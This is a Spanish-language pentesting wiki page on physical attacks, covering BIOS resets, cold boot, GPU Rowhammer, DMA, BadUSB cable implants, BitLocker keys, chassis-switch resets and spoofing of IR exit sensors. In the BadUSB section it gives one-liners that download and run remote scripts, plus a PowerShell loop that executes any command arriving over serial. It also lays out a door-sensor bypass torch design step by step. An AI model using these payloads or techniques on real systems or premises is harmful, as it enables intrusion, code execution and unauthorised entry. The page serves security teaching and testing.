# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperación de contraseñas del BIOS y seguridad del sistema

La configuración del firmware de PC heredado puede restablecerse desconectando la batería CMOS o utilizando un jumper documentado para borrar la CMOS. El tiempo necesario con el equipo apagado depende de la placa, y las contraseñas o claves modernas de UEFI pueden almacenarse en una memoria flash no volátil, en un controlador integrado o en un dispositivo de seguridad y, por tanto, sobrevivir a la retirada de la batería. Consulta el manual de la placa o de servicio antes de poner pines en cortocircuito; este procedimiento también puede invalidar las mediciones del TPM y activar la recuperación del cifrado de disco.

En sistemas x86 heredados, herramientas como **killCMOS** y **CmosPwd** pueden inspeccionar o modificar la configuración respaldada por la CMOS desde un entorno arrancable. CmosPwd reconoce formatos de contraseña de un conjunto documentado de familias de BIOS antiguas y puede realizar copias de seguridad, restaurar o borrar/eliminar el estado de la CMOS; sus builds publicadas están dirigidas a entornos DOS/Windows heredados, Linux, FreeBSD y NetBSD.<sup>[[18]](#references)</sup> Estas utilidades no son eliminadores genéricos de contraseñas UEFI y requieren suficiente acceso al hardware/firmware.

Algunos firmwares de portátiles muestran un código de desafío específico del proveedor después de varios intentos fallidos de contraseña. Bases de datos como [bios-pw.org](https://bios-pw.org) pueden derivar contraseñas de recuperación heredadas del proveedor para algunos modelos, pero muchos sistemas implementan un bloqueo sin un desafío derivable. Trata cualquier contraseña generada como específica del modelo y evita agotar los contadores permanentes de intentos.

### Seguridad de UEFI

Para sistemas **UEFI** modernos, CHIPSEC puede auditar las protecciones de las variables de Secure Boot. Comienza con la comprobación no modificadora que aparece a continuación; el modo opcional `-a modify` intenta deliberadamente corromper variables y solo debe utilizarse en un sistema de laboratorio recuperable. CHIPSEC advierte que su driver privilegiado y el acceso al hardware de bajo nivel no son adecuados para endpoints de producción.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Análisis de RAM y ataques Cold Boot

La DRAM no pierde todos los bits inmediatamente cuando se detiene el refresh. La tasa de degradación varía considerablemente según la tecnología del módulo y la temperatura; el enfriamiento puede conservar datos útiles durante mucho más tiempo que un ciclo de apagado y encendido sin refrigeración. Un ataque cold-boot reinicia rápidamente en un entorno de adquisición pequeño o transfiere un módulo enfriado, captura la memoria sin procesar y reconstruye claves criptográficas a pesar de la degradación de los bits. Una utilidad de copia de disco no es automáticamente un imager de memoria física, y Volatility analiza una captura en lugar de adquirirla; utiliza una herramienta de adquisición adecuada para la plataforma y validada.<sup>[[12]](#references)</sup>

---

## Rowhammer de GPU contra tablas de páginas

Los ataques modernos de GPU Rowhammer son mucho más útiles cuando apuntan a **metadatos de memoria virtual de la GPU** en lugar de a buffers ordinarios. Trabajos recientes sobre **GPU NVIDIA Ampere con GDDR6** muestran que un atacante que ejecuta código CUDA sin privilegios puede crear patrones de hammering específicos para la GPU, usar **memory massaging** para colocar estructuras de paginación en filas vulnerables y, posteriormente, cambiar bits en la **tabla de páginas de último nivel** o en un **directorio de páginas** intermedio. Una vez que se corrompe una sola entrada de traducción, el atacante puede obtener **lectura/escritura arbitraria de memoria de la GPU** y después pivotar hacia el compromiso del host.<sup>[[1]](#references)[[2]](#references)</sup>

### Patrón de explotación

1. **Perfilar filas susceptibles de hammering** en GDDR6 y crear patrones de hammering conscientes del refresh / no uniformes que eviten las mitigaciones integradas en la DRAM.
2. **Aplicar memory massaging a las asignaciones de la GPU** para que el driver coloque las estructuras de traducción de páginas en ubicaciones físicas susceptibles de hammering, en lugar de mantenerlas en el pool protegido predeterminado. En la práctica, esto puede implicar agotar la región de tablas de páginas de memoria baja y distribuir grandes mappings UVM dispersos con strides controlados.
3. **Cambiar los metadatos de traducción**, como **PFN** o bits relacionados con el aperture dentro de una entrada de tabla de páginas / directorio de páginas, de modo que la página virtual controlada por el atacante se resuelva en páginas de tablas de páginas, memoria arbitraria de la GPU o mappings de sistema visibles para el host.
4. Reutilizar el mapping falsificado para reescribir entradas de traducción adicionales y escalar hasta obtener **lectura/escritura arbitraria de memoria de la GPU** entre contextos de GPU.

### Pivot hacia el host y mitigaciones

- Con **IOMMU deshabilitado**, los mappings falsificados del system-aperture pueden exponer memoria física arbitraria del **host** a la GPU, convirtiendo la primitiva de la GPU en un compromiso completo del host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** apunta a entradas de tablas de páginas de último nivel, mientras que **GeForge** muestra que corromper un nivel de directorio de páginas puede ser más sencillo, porque un cambio de un solo bit puede redirigir un subárbol de traducción más grande. No consideres una sola capa de paginación como la única crítica para la seguridad.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** sigue siendo importante porque bloquea la ruta directa hacia memoria arbitraria del host utilizada por GDDRHammer/GeForge, pero **no es una mitigación completa**. **GPUBreach** muestra un pivot de segunda etapa en el que el atacante corrompe buffers de CPU propiedad del driver y escribibles por la GPU, y después activa bugs de memory safety del driver de NVIDIA para obtener una primitiva de escritura en el kernel y una **root shell**, incluso con IOMMU habilitado.<sup>[[3]](#references)</sup>
- **ECC a nivel de sistema** es una medida práctica de hardening en GPU de workstation/server compatibles. Las GPU de consumo sin ECC exponen una superficie de defensa más débil.<sup>[[4]](#references)</sup>
- Estos ataques no son puramente teóricos: **GeForge** informó de **1,171** cambios de bits en una RTX 3060 y **202** en una RTX A6000, lo que fue suficiente para construir una cadena funcional de escalada de privilegios en el host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de acceso directo a memoria (DMA)

Para el patching offline de UEFI IFR/NVRAM que puede degradar la aplicación de IOMMU durante el pre-boot y habilitar una cadena DMA contra Windows, consulta:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demuestra la **adquisición y el patching de memoria mediante DMA** a través de interfaces como FireWire y las primeras configuraciones de Thunderbolt, incluidos patrones históricos de bypass de login. No es simplemente “ineficaz contra Windows 10”: la explotabilidad depende de la interfaz, la build objetivo, la política de IOMMU, el estado de bloqueo y de si Windows Kernel DMA Protection es compatible y está habilitado. Windows 10 versión 1803 y posteriores introdujeron Kernel DMA Protection en plataformas compatibles, modificando sustancialmente la superficie de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para acceder al sistema

En un volumen de Windows sin cifrar o ya desbloqueado, un entorno offline puede reemplazar binarios de accesibilidad como **sethc.exe** o **Utilman.exe** por **cmd.exe**, obteniendo un command prompt de SYSTEM cuando se ejecuta el shortcut correspondiente de la pantalla de login. Herramientas como **chntpw** pueden editar los datos de las cuentas locales de SAM. Estos métodos no evitan un volumen de BitLocker bloqueado y pueden dañar credenciales protegidas con DPAPI/EFS; conserva copias forenses y backups.

**Kon-Boot** es una herramienta comercial de bypass de autenticación durante el boot para configuraciones compatibles de Windows/macOS. La compatibilidad depende del sistema operativo, el modo del firmware, Secure Boot y la configuración de disk-encryption; no descifra un volumen bloqueado con BitLocker.<sup>[[10]](#references)</sup>

---

## Gestión de las funciones de seguridad de Windows

### Shortcuts de boot y recovery

- **Delete/Supr**, F2, F10 u otra tecla del vendor puede abrir la configuración del firmware.
- **F8** entra en las opciones avanzadas de boot heredadas de Windows únicamente en configuraciones donde esa ruta siga habilitada; la entrada al recovery actual varía.
- Mantener pulsado **Shift** puede suprimir el login automático de Windows en algunas configuraciones, aunque los ajustes de policy/registry pueden deshabilitar ese comportamiento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** y placas Teensy pueden enumerarse como teclados HID de confianza e inyectar keystrokes predefinidos. El payload tiene inicialmente los privilegios y el acceso al desktop de la sesión con login; los prompts de UAC, el bloqueo de pantalla, el layout del teclado, el timing y la policy USB del endpoint siguen limitándolo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Los privilegios de administrador o de backup pueden crear una shadow copy o guardar registry hives para adquirir archivos bloqueados como **SAM** y **SYSTEM**. Esta es una técnica de recopilación post-compromise, no un bypass de privilegios, y debe correlacionarse con eventos de `diskshadow`/VSS y de exportación de registry hives.

## Técnicas de implantes BadUSB / HID

### Implantes de cables gestionados por Wi-Fi

- Los implantes basados en ESP32-S3, como **Evil Crow Cable Wind**, se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran exclusivamente como un teclado USB y exponen su stack de C2 mediante Wi-Fi. El operador solo necesita alimentar el cable desde el host de la víctima, crear un hotspot llamado `Evil Crow Cable Wind` con la contraseña `123456789` y navegar a [http://cable-wind.local/](http://cable-wind.local/) (o a su dirección DHCP) para acceder a la interfaz HTTP integrada.<sup>[[8]](#references)</sup>
- La UI del browser proporciona tabs para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados se etiquetan por sistema operativo, los layouts de teclado cambian sobre la marcha y las cadenas VID/PID pueden alterarse para imitar periféricos conocidos.
- Debido a que el C2 vive dentro del cable, un teléfono puede preparar payloads, activar su ejecución y gestionar las credenciales Wi-Fi sin utilizar la red de la organización, lo que resulta útil para intrusiones físicas de corta permanencia.

### Payloads AutoExec con reconocimiento del sistema operativo

- Las reglas AutoExec vinculan uno o más payloads para que se ejecuten inmediatamente después de la enumeración USB. El implante realiza un fingerprinting ligero del sistema operativo y selecciona el script correspondiente.
- Flujo de trabajo de ejemplo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución no requiere intervención, simplemente cambiar un cable de carga puede conseguir el acceso inicial “plug-and-pwn” bajo el contexto del usuario con login.

### Remote shell mediante HID-bootstrapped sobre Wi-Fi TCP

1. **Bootstrap mediante keystrokes:** Un payload almacenado abre una consola y pega un loop que ejecuta todo lo que llegue en el nuevo dispositivo USB serial. Una variante mínima para Windows es:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** El implant mantiene abierto el canal USB CDC mientras su ESP32-S3 inicia un cliente TCP (script de Python, APK de Android o ejecutable de escritorio) de vuelta al operador. Cualquier byte escrito en la sesión TCP se reenvía al canal serie anterior, lo que permite la ejecución remota de comandos incluso en hosts aislados de Internet. La salida es limitada, por lo que los operadores suelen ejecutar comandos a ciegas (creación de cuentas, preparación de herramientas adicionales, etc.).

### Superficie de actualización HTTP OTA

- La interfaz documentada de Evil Crow Cable Wind expone un endpoint de actualización de firmware sin autenticación en `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Los operadores de campo pueden intercambiar funciones en caliente (por ejemplo, el firmware de flash USB Army Knife) en mitad de una operación sin abrir el cable, lo que permite que el implant cambie a nuevas capacidades mientras sigue conectado al host objetivo.

## Omitir el cifrado de BitLocker

Una adquisición forense autorizada de un sistema activo o utilizado recientemente puede contener una clave maestra de volumen de BitLocker o material de clave relacionado mientras el volumen está desbloqueado. Herramientas comerciales como Elcomsoft Forensic Disk Decryptor y Passware Kit Forensic pueden buscar en imágenes de memoria compatibles, archivos de hibernación o volcados de memoria, pero el éxito no está garantizado. Las versiones modernas de Windows también cifran los volcados de memoria cuando BitLocker está habilitado, y una contraseña de recuperación de 48 dígitos almacenada es un artefacto diferente de una clave de volumen presente en memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingeniería social para añadir una clave de recuperación

Un atacante que convenza a un administrador para ejecutar comandos de gestión de BitLocker puede añadir un protector de contraseña de recuperación, una clave externa u otro protector y luego capturarlo. Una contraseña de recuperación no puede ser una cadena arbitraria de ceros: las contraseñas de recuperación numéricas de BitLocker tienen un formato validado de 48 dígitos. La sintaxis de administración autorizada pertinente es `manage-bde -protectors -add C: -recoverypassword`; enumera los protectores resultantes con `manage-bde -protectors -get C:`. Supervisa las adiciones de protectores y asegúrate de que el nuevo material de recuperación se almacene únicamente en ubicaciones aprobadas.<sup>[[16]](#references)</sup>

---

## Explotar los interruptores de intrusión del chasis / mantenimiento para restablecer la BIOS a los valores de fábrica

Muchos portátiles modernos y equipos de sobremesa compactos incluyen un **interruptor de intrusión del chasis** supervisado por el Embedded Controller (EC) y el firmware de BIOS/UEFI. Aunque la finalidad principal del interruptor es generar una alerta cuando se abre un dispositivo, algunos fabricantes implementan un **atajo de recuperación no documentado** que se activa cuando el interruptor se acciona siguiendo un patrón específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Cómo funciona el ataque

1. El interruptor está conectado a una **interrupción GPIO** del EC.
2. El firmware que se ejecuta en el EC registra el **momento y el número de pulsaciones**.
3. Cuando se reconoce un patrón codificado, el EC invoca una rutina de *mainboard-reset* que **borra el contenido de la NVRAM/CMOS del sistema**.
4. En el siguiente arranque, los modelos afectados cargan el estado de firmware restablecido. Según el fabricante y la revisión, el estado borrado puede incluir una contraseña de supervisor, ajustes de arranque personalizados o claves de Secure Boot registradas; el estado del TPM y los efectos sobre el cifrado del disco deben evaluarse por separado.

> Un restablecimiento del firmware puede restaurar las opciones de arranque externo, pero **no** descifra el almacenamiento. BitLocker u otro sistema de cifrado de disco completo puede entrar en modo de recuperación después de cambios en el TPM o el firmware y seguir protegiendo la unidad interna sin una clave de recuperación.<sup>[[16]](#references)</sup>

### Ejemplo del mundo real – portátil Framework 13

El atajo de recuperación para el Framework 13 (11.ª/12.ª/13.ª generación) es:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Después del décimo ciclo, el EC establece un flag que ordena al BIOS borrar la NVRAM en el siguiente reinicio. Todo el procedimiento tarda ~40 s y requiere **nada más que un destornillador**.<sup>[[5]](#references)</sup>

### Procedimiento de Exploitation Genérico

1. Enciende o suspende-reanuda el objetivo para que el EC esté funcionando.
2. Retira la cubierta inferior para dejar expuesto el interruptor de intrusión/mantenimiento.
3. Reproduce el patrón de alternancia específico del proveedor (consulta la documentación y los foros, o realiza reverse-engineering del firmware del EC).
4. Vuelve a montar y reinicia; después, inspecciona qué ajustes del firmware y credenciales cambiaron realmente.
5. Si tienes autorización y el arranque externo está disponible, inicia una live image controlada. Una vez que un volumen interno esté legítimamente desbloqueado (o si nunca estuvo cifrado), el entorno live puede adquirir credenciales y datos, o inspeccionar la EFI System Partition. Modificar esa partición para instalar un EFI implant es persistente y altamente intrusivo, y sigue estando limitado por Secure Boot, measured boot, la protección contra escritura del firmware y la monitorización del endpoint. El almacenamiento cifrado permanece inaccesible sin su clave o material de recuperación.

### Detección y Mitigación

* Registra los eventos de intrusión del chasis en la consola de gestión del sistema operativo y correlaciónalos con reinicios inesperados del BIOS.
* Utiliza **sellos con evidencia de manipulación** en tornillos y cubiertas para detectar aperturas.
* Mantén los dispositivos en **áreas bajo control físico**; asume que el acceso físico equivale a un compromiso total.
* Cuando esté disponible, desactiva la función del proveedor de “reset mediante interruptor de mantenimiento” o exige una autorización criptográfica adicional para los resets de NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Características del sensor
- Los sensores comerciales de “wave-to-exit” emparejan un emisor LED de near-IR con un módulo receptor similar al de un mando a distancia de TV, que solo informa un nivel lógico alto después de detectar múltiples pulsos (~4–10) de la portadora correcta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una cubierta de plástico impide que el emisor y el receptor se vean directamente, por lo que el controlador asume que cualquier portadora validada procede de un reflejo cercano y activa un relé que abre el cierre de la puerta.
- Una vez que el controlador cree que hay un objetivo presente, suele cambiar la envolvente de modulación saliente, pero el receptor continúa aceptando cualquier ráfaga que coincida con la portadora filtrada.

### Flujo del ataque
1. **Captura el perfil de emisión** – conecta un analizador lógico entre los pines del controlador para registrar las formas de onda, tanto previas como posteriores a la detección, que controlan el LED IR interno.
2. **Reproduce únicamente la forma de onda “posterior a la detección”** – retira o ignora el emisor de fábrica y controla un LED IR externo con el patrón ya activado desde el inicio. Como al receptor solo le importan el número de pulsos y la frecuencia, trata la portadora spoofeada como un reflejo genuino y activa la línea del relé.
3. **Controla la transmisión** – transmite la portadora en ráfagas ajustadas (por ejemplo, decenas de milisegundos encendida y un intervalo similar apagada) para entregar el número mínimo de pulsos sin saturar el AGC del receptor ni su lógica de gestión de interferencias. La emisión continua desensibiliza rápidamente el sensor e impide que el relé se active.

### Inyección reflectiva de largo alcance
- Sustituir el LED de laboratorio por un diodo IR de alta potencia, un driver MOSFET y óptica de enfoque permite activar el sensor de forma fiable desde ~6 m de distancia.
- El atacante no necesita línea de visión con la apertura del receptor; apuntar el haz hacia paredes interiores, estanterías o marcos de puertas visibles a través del cristal permite que la energía reflejada entre en el campo de visión de ~30° y simule un movimiento de mano a corta distancia.
- Como los receptores esperan únicamente reflejos débiles, un haz externo mucho más potente puede rebotar en varias superficies y seguir por encima del umbral de detección.

### Linterna de ataque weaponised
- Integrar el driver dentro de una linterna comercial oculta la herramienta a plena vista. Sustituye el LED visible por un LED IR de alta potencia adaptado a la banda del receptor, añade un ATtiny412 (o similar) para generar las ráfagas de ≈30 kHz y utiliza un MOSFET para absorber la corriente del LED.
- Una lente telescópica de zoom estrecha el haz para aumentar el alcance y la precisión, mientras que un motor de vibración controlado por el MCU proporciona confirmación háptica de que la modulación está activa sin emitir luz visible.
- Alternar entre varios patrones de modulación almacenados (con frecuencias de portadora y envolventes ligeramente diferentes) aumenta la compatibilidad entre familias de sensores renombradas, permitiendo al operador recorrer superficies reflectantes hasta que el relé haga clic de forma audible y la puerta se abra.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
